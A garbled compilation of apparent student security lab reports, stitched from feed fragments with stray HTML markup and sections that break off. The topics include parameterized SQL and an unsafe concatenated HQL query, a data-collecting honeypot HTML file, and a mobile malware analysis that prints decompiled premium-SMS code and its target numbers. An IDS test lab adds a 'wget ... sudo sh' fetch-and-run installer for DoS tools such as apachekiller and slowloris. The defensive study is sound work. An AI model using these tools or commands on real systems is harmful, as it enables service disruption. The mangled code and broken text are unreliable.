&lt;p&gt;Ruby on Rails provides with many session storage option:&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;PStore – it implements a file based persistence mechanism based on a
    Hash. User code can store hierarchies of Ruby objects (values) into
    the data store file by name (keys). An object hierarchy may be just
    a single object. User code may later read values back from the data
    store or even update data, as needed. The files that are stored are
    usually located in the tmp/sessions folder for the Rails app. The
    main downside of using the PStore is that you will have to do some
    session-pruning periodically because performance decreases as the
    number of sessions stored increases.&lt;/li&gt;
&lt;li&gt;ActiveRecordStore – keeps the session id and hash in a database
    table and saves and retrieves the hash on every request.&lt;/li&gt;
&lt;li&gt;CookieStore – it saves the session hash directly in a cookie on the
    client-side. The server retrieves the session hash from the cookie
    and eliminates the need for a session id. Cookie-based sessions are
    just faster to retrieve and process than hitting the file-system on
    every request, were it was previously. Cookies are generally limited
    to 4K in size. While not an issue for most (proper) usage of the
    session, this could be a legitimate limit for some scenarios. If
    your application abuses the session, you’ll need to decide on a
    different session store that are available. The cookie has a SHA512
    fingerprint attached and is hashed with a secret stored up on the
    server and there are, however, derivatives of CookieStore which
    encrypt the session hash, so the client cannot see it.&lt;/li&gt;
&lt;li&gt;DRbStore – it store uses distributed Ruby to store a user’s session
    data. The performance is great, but it requires a bit more setup
    than the other stores.&lt;/li&gt;
&lt;li&gt;FileStore – This store keeps the fragments on the hard disk instead
    of in memory. It works well if you have a lot of file storage and
    have outgrown the MemoryStore.&lt;/li&gt;
&lt;li&gt;MemoryStore – keeps your session data in server memory. It keeps the
    fragments in your application’s memory, which can potentially take
    up a lot of memory on your server. It is used by default, but it is
    hard to manage and scale if your application becomes popular.&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; Ruby on Rail CookieStore is available only in edge rails.
PStore is the default option for stable release, whereas its CookieStore
as default for edge rails.&lt;/p&gt;
&lt;/p&gt;

&lt;/p&gt;

&lt;h1&gt;2. Parameterized statements into Java with JDBC, C# with ASP.NET, PHP5, php-mysqli, Perl, Python and Hibernate Query Language (HQL)&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;For this task we will take a look at the parameterized statement API-s
and we will find out and document how much does each of them protect
against the following possible misuses of SQL statements:&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;String injection (quotes, double quotes)&lt;/li&gt;
&lt;li&gt;SQL statement injection (expression syntax etc)&lt;/li&gt;
&lt;li&gt;Out of range integers&lt;/li&gt;
&lt;li&gt;Blind SQL injection&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;h2&gt;Java with JDBC&lt;/h2&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    PreparedStatement prep =conn.prepareStatement("SELECT * FROMUSERSWHERE USERNAME=? AND PASSWORD=?");prep.setString(1, username);prep.setString(2, password);prep.executeQuery();

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;There are no possibilities of string injection because of the filtering
the statements. It enables users’ input to be initially filtered
instead  of directly embedding it in the SQL statements. In this example
is that the each parameter is a scalar, not a table, where the user
input is then assigned (bound) to a parameter. It is a good idea if the
character range is limited. Another thing that can be done to avoid SQL
injection is to convert numeric values to integers before parsing them
into the SQL statement. Or using ISNUMERIC to verify that they are
integers.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;C# with ASP.NET&lt;/h2&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    using (SqlCommand myCommand =new SqlCommand("SELECT * FROM USERSWHEREUSERNAME=@user ANDPASSWORD=HASHBYTES(’SHA1’, @pwd)",myConnection)){myCommand.Parameters.AddWithValue("@user",user);myCommand.Parameters.AddWithValue("@pwd",pass);myConnection.Open();SqlDataReader myReader =myCommand.ExecuteReader();...}

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;The placeholder – @user and the hashbyte value of password @pws – has
become part  if the hardcoded SQL. At runtime, the value provided by the
querystring is passed to the database along with the hardcoded SQL, and
the database will check the Username and password field as it attempts
to bind the parameter value to it. This ensures a level of strong
typing. If the parameter value is not the right type for the database
field (a string, or numeric that’s out of range for the field type), the
database will be unable to convert it to the right type and will reject
it. If the target field datatype is a string (char, nvarchar etc), the
parameter value will be “stringified” automatically, which includes
escaping single quotes. It will not form part of the SQL statement to be
executed.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;PHP5&lt;/h2&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    $db = new PDO(’pgsql:dbname=database’);$stmt = $db-prepare("SELECT priv FROM testUsers WHERE username=:username AND password=:password");$stmt-bindParam(’:username’, $user);$stmt-bindParam(’:password’, $pass);$stmt-execute();

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;In this example to protect against SQL injection, it is used an input
not directly to be  embedded in SQL statements. Instead, it is used an
parameterized statements (preferred), or user input must be carefully
escaped or filtered. This example shows and parameterized
example/statement in php v. 5 and PDO database to protect from SQL
injections and blind SQL injections.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;PHP-MySQLi&lt;/h2&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    $db = new mysqli("host", "user", "pass","database");$stmt = $db - prepare("SELECT priv FROM testUsers WHERE username=? AND password=?");$stmt -  bind_param("ss", $user, $pass);$stmt - execute();

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Same as above but this time it is used the vendor-specific methods; for
instance, using the mysqli extension for MySQL 4.1 and create
parameterized statements to protect from the SQL injection.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;Perl&lt;/h2&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    use DBI;my $db = DBI-connect(’DBI:mysql:mydatabase:host’, ’login’, ’password’);$statment = $db-&amp;amp;amp;amp;amp;amp;gt;prepare("UPDATE players SET name = ?, score = ?, active = ? WHERE jerseyNum = ?");$rows_affected = $statment-&amp;amp;amp;amp;amp;amp;gt;execute("Smith, Steve", 42, ’true’, 99);

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Automatically “sanitize” input to parameterized SQL statements to avoid
the catastrophic  database attacks.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;Python&lt;/h2&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    import sqlite3db = sqlite3.connect(’:memory:’)db.execute(’update players set name=:name, score=:score,active=:active where jerseyNum=:num’, {’num’: 100, ’name’: ’John Doe’, ’active’: False, ’score’: -1})

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;It is parameterized statement with an example of named placeholders.
Which insure to avoid the SQL injections and database attacks.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;Hibernate Query Language (HQL)&lt;/h2&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    Query safeHQLQuery = session.createQuery("from Inventory where productID=:productid");safeHQLQuery.setParameter("productid", userSuppliedParameter);

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Unsafe example: Query unsafeHQLQuery = session.createQuery(“from
Inventory where productID=’”+userSuppliedParameter+”‘”); The example
from left it’s used prepared statement approach because all the SQL code
stays within the application. This makes your application relatively
database independent. However, other options allow you to store all the
SQL code in the database itself, which has both security and
non-security advantages and the approach is called Stored Procedure&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;3. Unix permission model, Unix ACL and Windows 7 security model&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;In this topic we will describe two security set-ups that can not be
expressed with traditional Unix permission model, UNIX ACL and Windows 7
security model.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;Unix permission model&lt;/h2&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Giving an different permission to different users in the same group&lt;/li&gt;
&lt;li&gt;Read and write permission/access to all groups, which gives and
    access to the ‘private files’, and you can gain access through a
    root account by an unwanted user, which brings and complete breach
    of the system&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;h2&gt;Unix ACL- enabled permission model&lt;/h2&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;If the user has permission over the file, he can read/write and
    delete it, which brings that it is not possible to give ‘some’
    permission to the user.&lt;/li&gt;
&lt;li&gt;ACL’s are not very portable and are very hard to maintain. For
    instance good example is transferring of files with ACL’s between
    different of Unix systems is an exercise for brave person, even if
    the both file systems support them. Which brings a difficulty to
    maintain for existing files for instance backup, restore, copying,
    etc.&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;h2&gt;Windows 7 security model&lt;/h2&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;As a standard user you can perform an action that requires
    administrator privileges by the UAC(User Access Control), which is
    controlled by the Admin Approval Mode. It can be turn off and on.
    Every time when you need to gain an access of the administration
    privileges it will be prompt a dialog box to gain and provide the
    password for an access. Therefore in the medium settings with any
    malware could turn it off.&lt;/li&gt;
&lt;li&gt;And the settings of the UAC are in medium mode not off, still brings
    an opportunity to being turn off by the malware.&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;h1&gt;4. Finding all the security vulnerabilities in bash script&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;In this topic we will find all the possible vulnerabilities into the
following bash script:&lt;/p&gt;
&lt;/p&gt;

+--------------------------------------+--------------------------------------+&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;We should avoid temporary file, instead we should use pipes [2]. We
should avoid eval [2].&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Using the double brackets, instead of single one &lt;code&gt;[[... ]]&lt;/code&gt; it is
comment on the script above [1]. \$REPLY can be used to read the
previous value of the dir and pattern variable [1]. We can use instead
of find, while read contracture (loop) [1]. Find – can be set with a
cycle, for or while to check the validation of the file and the
directory/path, also comment on the script or using
&lt;code&gt;“$pattern” /tmp/listing&lt;/code&gt; [1]. No sensitization of the input, the user
can put any value and therefore, execute any command to create another
command. As we can see above the script it looks like that it is
security vulnerable. If we want to implement the security in the script
we should implement the above changes into the script.&lt;/p&gt;
&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;The main goal of laboratory report is to identify possible leaked/stolen
information, documents from our system without recognising that attacker
had an access. Thus access of the document will inform us immediately
with the information of the burglar. The report should highlight the
following aspects:&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Constructed an document …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;h1&gt;INTRODUCTION&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;The main goal of laboratory report is to identify possible leaked/stolen
information, documents from our system without recognising that attacker
had an access. Thus access of the document will inform us immediately
with the information of the burglar. The report should highlight the
following aspects:&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Constructed an document as non malicious code, for instance honey
    document that will help us to track from where, who, information
    about the system, etc. is using our document.&lt;/li&gt;
&lt;li&gt;Detail description of process, how did we build the document and the
    idea behind the tracking system.&lt;/li&gt;
&lt;li&gt;Description of needed infrastructure that is tracking the document.&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;The laboratory report is created by a team of 7 members. Where each
member had own task to accomplish. Moreover, to be more contingent the
unknown person has gain access to our computer/laptop. Thereby he is
looking for interesting name of file, folder, etc. that most likely will
have a content of interesting data, information for his purpose. After
he downloaded file/folder from our system the intruder will open this
file in his system assuming that contains very important
personal/corporate information. However, by opening this file/folder,
document it will send us immediately leaked information about his system
to our server and additionally an e-mail. This process and procedures
that are behind the honeypot document, or with other words trap set to
detect, deflect, or in some manner counteract attempts at unauthorized
use of information systems [1] is described in following sections.
Furthermore, the coding of the honeypot document is done in HTML file
with additional java script queries, where detail information and
construction are displayed in Honeypot section. Meanwhile in Appendix
section we provide the code of the honeypot document and additional what
is the leaked/collected information of the intruder system, with other
word, content illustration of mail and server logs.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Finally the conclusion made of the laboratory report will be concise in
summary section.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;HONEYPOT IDEA&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;HTML file We can name the file online banking or etc. cause it is html
and it is more convincing way that the attacker will assume that this is
an not only a online banking link but yet an the stored cookies and
other leaked information. The honeypot file has inline javascript that
will collect as much information as it can from the users browser, make
it into a JSON object and create a request to our server using that
information. The request will return an image, so nothing will be
broken, however on our server we decode the information and send
ourselves an alert email, that someone has accessed that document and
where the accessing came from. There is also an image embedded that
requests it from our server- these requests are logged and we see the IP
address of the opener. This is as a backup in case the user doesn’t
allow javascript to execute.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;How we lure an attacker into trap&lt;/strong&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;To discover the identity of attacker and get information, she/he has to
open html file. Besides setting up honeypot from technical point of
view, we have to make document attractive. On our system all the
documents will be protected by (different) passwords. We can have same
password for files with same extensions (for example, for PDFs or for MS
Word documents). In html file, we store these passwords. The name of
html document should be corresponding (“file passwords” for example).
Attacker will need additional time to crack the passwords, so we are
offering easy, quick way to get over additional obstacles. Actually, in
html file passwords should be correct not no make the attacker
suspicious. Attacker may be suspicious why we stored this kind of
information in html file, but it can be explained with the following
reasons: a) to open html (with notepad or browser for example) is
quicker than opening .pdf and .doc (by Adobe Reader and MS Word
respectively) b) html has different extension (.html) that PDF or MS
Word documents, so it has different icon in GUI. If you put a lot of
different files in a folder, html is much easier to find with a glance
among PDFs and DOCs.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;What information we get&lt;/strong&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The honeypot is scripted to give us the following information about the
attacker: first of all IP address. Time, hen the attacker accessed the
honeypot file. Except that, we also get information about user agent,
OS, language and other details about attacker’s system. For this
concrete task that should be enough. The script is configurable to get
some additional information too. As our plan is to simply gather
information on our infiltrator, it is essential to avoid being malicious
with our code. It will not alter target’s system or bypass any
restrictions of it. The solution will not announce itself and will be as
stealthy as possible.&lt;/p&gt;
&lt;p&gt;The information is sent to mail. For the example of sent e-mail, please
refer to Appendix 2.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;HONEYPOT INFRASTRUCTURE&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;We need a Web server running PHP. The PHP script will collect the JSON
data received  &lt;/p&gt;
&lt;p&gt;from the attacker, format it nicely and send via email to people who
will process it. If  &lt;/p&gt;
&lt;p&gt;JavaScript is not enabled on the attacker’s side we rely on the fact
that a picture is  &lt;/p&gt;
&lt;p&gt;accessed from the honeypot html file. The server has to serve this image
and the request  &lt;/p&gt;
&lt;p&gt;for it of course appears in the web server access logs. This information
again is processed by the same PHP script mentioned above and forwarded
to analysts. Another alternative way to inform security personnel about
this honeypot image being accessed is the Simple Event Corelator (SEC)
written by Risto Vaarandi [2]. This software is freely available under
GPL license. We could write a rule for SEC that would monitor the web
server access log file for the specific image file request and send an
email with the IP address from which the image was accessed. The rule
that is used for SEC can be found in Appendix 3. The content we are
looking for in the log file may look like this:&lt;/p&gt;
&lt;p&gt;```192.168.1.34 - - [07/Dec/2011:19:16:07 +0200] "GET /honey.png
HTTP/1.1" 200 1932```&lt;/p&gt;
&lt;p&gt;# SUMMARY&lt;/p&gt;
&lt;p&gt;Nowadays the most common vector in unauthorized access into the system
is followed by stealing important data, either is from personal computer
or corporate network. Therefore, solution of implementing a trap for
detecting, and deflecting the attacker of collecting valuable
information is important. This laboratory report consists solution for
future detection, by creating an honeypot document that will help us to
collect data from the attacker. The document it self it is not an
malicious code, likewise does not corrupt or infect the attacker system.
Solution provided above is designed with an simple infrastructure which
help us to identify identity of attacker in different operation system.&lt;/p&gt;
&lt;p&gt;Moreover, the honeypot document provides us an information of what is
the attacker or user of this document operation system, which browser he
is using, what plugins are installed in the browser and additional the
time of accessing the file and attached IP address. Thereby, by
identifying the above information will guide us in further steps. For
instance by identifying his IP address we can find his location, ISP,
etc. However, is this above provided information enough? The answer to
the question is simple, indeed it is, cause we don’t need more. The idea
in this laboratory is not to find or assail the attacker, but it is just
to identify, and realize that someone had an unauthorized access to the
system and to distinguish his identity. Consequently, from the above we
can conclude that we rather gather the information from the attacker
then to attack him back.&lt;/p&gt;
&lt;p&gt;# APPENDICES&lt;/p&gt;
&lt;p&gt;Appendix 1 is the HTML and Java script code presented and in addition in
Appendix 2 we present the e-mail received after the attacker has open
the document. SEC are described in Appendix 3.&lt;/p&gt;

&lt;p&gt;The goal of this post is to identify and analyze mobile malware file:
&lt;a href="https://sim.cert.ee/hw/mmc.jar"&gt;mmc.jar&lt;/a&gt;. Thereby please follow the

&lt;li&gt;Find code sending SMSes using ‘sms://’ URI&lt;/li&gt;
&lt;li&gt;Calculate short number used in SM.send&lt;/li&gt;
&lt;li&gt;Finally for compiling the code use the developing tool &lt;a href="http://www.eclipse.org/"&gt;Eclipse
    IDE&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;Firstly, we are going to analysis the Java source code after
decompilation. The accent is to find the code that is sending an SMSes
using the ‘sms://’ URL. After identifying the linking associated classes
we have to compile the code to move toward to final results of URLs. For
this purpose we are using the developing tool &lt;a href="http://www.eclipse.org/downloads/"&gt;Eclipse
IDE&lt;/a&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Therefore, the results and the sent SMSes URLs are going to be presented
into conclusion section. Which will complete the task and will yield the
basic analysis of mobile malware file.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;ANALYSIS&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;After running the decompiler tool we are examining and analyzing the
Java source code. Whereby on the source code on the class M.class line
343 we have found the following source code:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    if ((i &amp;gt;= 35)  (SM.isSending != true)  (i % 6 == 0) (f &amp; count_query)) {  if (SM.GS()) f += 1;   if (f == 1) {            RS.L(rs);            RS.L("Slide");            rs = RS.j("Slide");            game = RS.L(rs, Integer.toString((int)(System.currentTimeMillis() / 1000L)));            RS.L(rs);   }if (f &amp;lt; count_query) {  game = SM.send("sms://" + ms[1][b], ms[2][b]); // sms://  if (b == count_query) b = 1; else b += 1;}

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;The above code is associated with the class SM.class. With the following
source code:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    public static int send(String s, String s1){   if (isSending) return 0;      new SM(s, s1);   return -1;}public SM(String s, String s1) { success = false; isSending = true; this.destination = s; this.message = s1; try {      Thread thread = new Thread(this);      thread.start(); } catch (Exception exception) { isSending = false;}

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;The above code is checking if the message and the destination is
correct  &lt;/p&gt;
&lt;p&gt;and if the message is sent. Coloration is more like the first public
static method named &lt;em&gt;send&lt;/em&gt; with the two string values of &lt;em&gt;s&lt;/em&gt; and &lt;em&gt;s1&lt;/em&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;All the above extraction was finished by JD-Gui version 0.3.3 and
JD-Core version 0.6.0 and using the menu bar for search, with the
criteria that will meet our needs.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The bellow are executable results presented, done by eclipse after
compiling the code:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;From the above presented results after compiling the code we have
identify the number of SMSes URLs and in addition the exact URLs.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;CONCLUSION&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;We live in a world where nowadays for everyday work, communication, etc.
the most essentially tool is our mobile phones, smart phones, etc. We
used them for communication, sending SMS, playing games, checking
e-mails, social networking, bank transaction, etc. That is why today
there are hundreds and rising everyday mobile malware files. We need to
make sure what we are installing in our devices, what kind of games,
applications, etc. Therefore, this post will help for a people who are
interested to learn basic of how to analysis and identify malware files
for mobile phones. However, this is only a basic, and a good guide to
give you an idea of what kind of tools, applications you should have.
This task is done only for a Java source code mobile malware game.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Furthermore, from the above section we have identify the number of SMSes
that are sent and to what numbers. The total number of SMSes is 4 and
sent to the following URLs:&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    sms://7375sms://7202sms://1899sms://8385

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;Finally, mobile malware is rising and it is about to explode, therefore
users need education[1]. By delivering basic and advance mobile malware
security awareness program we will have less malware attacks and better
security policy into everyday mobile, smart phones usage.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Write a regular expression for matching the names which follow the

&lt;li&gt;Each name consists of one or more parts …&lt;/li&gt;&lt;/ol&gt;</summary><content type="html">&lt;p&gt;This post delivers solution of advance regular expression. In the

&lt;/p&gt;

&lt;h1&gt;Task&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Write a regular expression for matching the names which follow the
following rules:&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Each name consists of one or more parts. If there are two or more
    parts, they are separated either with a single space (” “) or dash
    (“-”) character.&lt;/li&gt;
&lt;li&gt;Each name part must consist of letters only. The name part must
    begin with an upper-case letter which are followed by one or more
    lower-case letters. Each name part can  have an optional prefix
    which begins with an upper-case letter, followed by one or more
    lower-case letters.&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;h1&gt;Solution&lt;/h1&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    ^([A-Z][a-z]+([A-Z][a-z]+)?(\s|-))*[A-Z][a-z]+([A-Z][a-z]+)?$

&lt;/div&gt;

&lt;/p&gt;

&lt;p&gt;For completing the task, we are dividing into several sub-tasks.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Firstly, we had to find expression, which satisfies the first
requirement of the task: representing one or more parts, which can be
separated either with space (“ “) or dash (“-”). Thereby, we can
represent space and dash with the following expression (\s|-).&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;If the entry is just one legitimate part (without space or dash after),
(\s|-) has 0 occurrences. Yet the entry may consist of many legitimate
parts divided by spaces or dashes. The expression should be (\s|-)*.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;As for the legitimate parts, we have to write expression considering
second part of requirements.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Legitimate part should consist of letters only, begin with (only one)
uppercase letter and followed by one or more lowercase letters.
Legitimate part can have prefix beginning with (only one) uppercase
letter, followed by one or more lowercase letters.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Therefore, &lt;code&gt;[A-Z][a-z]+&lt;/code&gt; represents the entry which begins uppercase
letter and is followed by one or more lower case letters. In addition,
to represent prefix, which occurs either 0 or 1 time, we will have the
following expression: &lt;code&gt;([A-Z][a-z]+)?&lt;/code&gt;. Moreover, to represent the whole
legitimate entry, we merge the two expressions (it does not matter
whether prefix expression comes first) with:
&lt;code&gt;[A-Z][a-z]+([A-Z][a-z]+)?&lt;/code&gt;. Thus with this expression we go back to
(\s|-)* where putting &lt;code&gt;[A-Z][a-z]+([A-Z][az]+)&lt;/code&gt; into parentheses with
(\s|-) and take * outside of parentheses (as this whole expression)
legitimate part with either space or dash should be presented for 0
or more consecutive times.&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
&lt;/p&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;(([A-Z][a-z]+([A-Z][a-z]+)?(\s|-))*&lt;/code&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;To be able to exclude entries, which end with “-”, we add expression of
legitimate part. and add “\^” and “\$” respectively at the beginning and
the end of expression, to mark the  beginning and an end of the string.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;^(([A-Z][a-z]+([A-Z][a-z]+)?(|s|-))*([A-Z][a-z]+([A-Z][a-z]+)?$&lt;/code&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Finally, we have the whole expression we have to test it (we have to put
the expression in quotation marks).&lt;/p&gt;
&lt;p&gt;&lt;code&gt;egrep ‘^([A-Z][a-z]+([A-Z][a-z]+)?(\s|-))*[A-Z][a-z]+([A-Z][a-z]+)?$’   file_name&lt;/code&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;The objective of this laboratory test, scenario is to create a solution
and instructions for testing an IDS\^1 systems usefulness for detecting
attacks against a wordpress site. In addition, a repeatable process to
evaluate vendor claims. Whatever passive IDS system sample delivered as
a VM or a dedicated box. Creating the IDS system itself is out of scope.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The process must be detailed enough so that somebody else can get the
same results when applying that. The “other person” is expected to have
IT knowledge sufficient to install and run a Linux desktop. Budget
requirements: Modest – 2 machines + a tester (Joe) + networking
equipment to connect the two machines and an IDS together. The process
must test at least the following attacks:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Port scan&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;SYN flood&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;“Regular” DoS overwhelming attack (Ab)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;Optionally the process may test:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;slowloris/pyloris&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Apache Range header DoS vulnerability
&lt;a href="http://httpd.apache.org/security/CVE-011-3192.txt"&gt;http://httpd.apache.org/security/CVE-011-3192.txt&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;An attack targeting any other fairly recent (not older than 3-4 years)
known vulnerability that could in theory apply to the target system
(wordpress server)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;However the competition rules are: The highest number of attacks
evaluated. Limits:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Each attack must be relevant eg. if it attacks IIS it’s NOT relevant.
If it attacks Windows RPC it’s not relevant. If it attacks some other
CMS eg. Drupal it’s NOT relevant. * Basically equivalent attacks count
as one (different port scanners for example).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;You must be able to explain in broad terms what the attack does eg:
attacks the vulnerability #X in Apache server If the #attacks is
equal.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;Lab instaractions:&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Install 3 VM-s: Attacker IDS and Target&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;
​1. Make sure all VM-s have two network adapters: NAT and Host-Only.&lt;/p&gt;
&lt;p&gt;​2. Install Snort and it’s GUI called “acidbase” on IDS
&lt;a href="https://help.ubuntu.com/community/SnortIDS"&gt;https://help.ubuntu.com/community/SnortIDS&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;​3. Install Apache, Mysql and WordPress on Target.&lt;/p&gt;
&lt;p&gt;​4. Execute an attack on Attacker towards the IP address on the Host
Only network.&lt;/p&gt;
&lt;p&gt;​5. Take notice of the results displayed on Acid console.&lt;/p&gt;
&lt;p&gt;​6. Reset counters, move on to next attack.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Additionally, illustration 1 describes the overview of above scenario&lt;/p&gt;
&lt;/p&gt;

thirdly illustrating the results and the functionality of proposals.
Finally, closing this laboratory report with conclusion. In addition,
appendixes is configuration of VM’s – Virtual Machines.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;SETUP of SNORT&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;To setup snort in a right way, that will work for the second Host only
network please following the instruction link provided with a full
description and configuration of snort [SNORT2].&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;After completing the setup and configuration to run snort on the second
interface use the following command:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;snort -c /etc/snort/snort/conf -i eth1&lt;/code&gt;&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;PROPOSALS&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;In total three proposals and each one is highlighted in the next
sub-sections.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;PROPOSAL 1&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;Full instructions&lt;/p&gt;
&lt;p&gt;​1. Set up IDS (Snort) and WordPress on the first PC&lt;/p&gt;
&lt;p&gt;​2. Install Ubuntu server on the second PC . Then install all attacking
tools there:&lt;/p&gt;
&lt;p&gt;```wget enos.itcollege.ee/\~avein/lab4i.sh&lt;/p&gt;
&lt;p&gt;sudo sh lab4i.sh&lt;/p&gt;
&lt;/p&gt;

&lt;div class="highlight"&gt;

    After that you should have:- ```ab.sh``` – DoS attack script – uses ab to generate traffic flood- ```apachekiller.pl``` – Apachekiller attack script More info: http://www.hackersgarage.com/apache-killer-denial-of-service-flaw-in-apache-webserver.html- ```README.txt``` – extra instructions- ```scan.sh``` - Port scanning script - uses nmap- ```sloworis.pl``` - Sloworis attack script More info: http://ha.ckers.org/slowloris/- ```synf.sh``` - syn flood attack script - uses hping33. Start your IDS/wordpress server and the server with attack tools. 4. Run each attack tool ONE AT A TIME (targeting the wordpress/IDS server of course) . Monitor the logs/notifications on yours IDS system (SNORT) and check whether wordpress site is still accessible. Let each attack tool run 2 minutes, then stop the attack by pressing CTRL+C on the terminal window where the attack tool is running. The only exeption is port scan- its better to wait until it finishes. After each attack save the IDS log and wait atlest 5 minutes before trying next tool (to give server time to recover). Best practice is to manually check if the server load is at normal (one can use htop for that).a) To run DoS attack:```sh 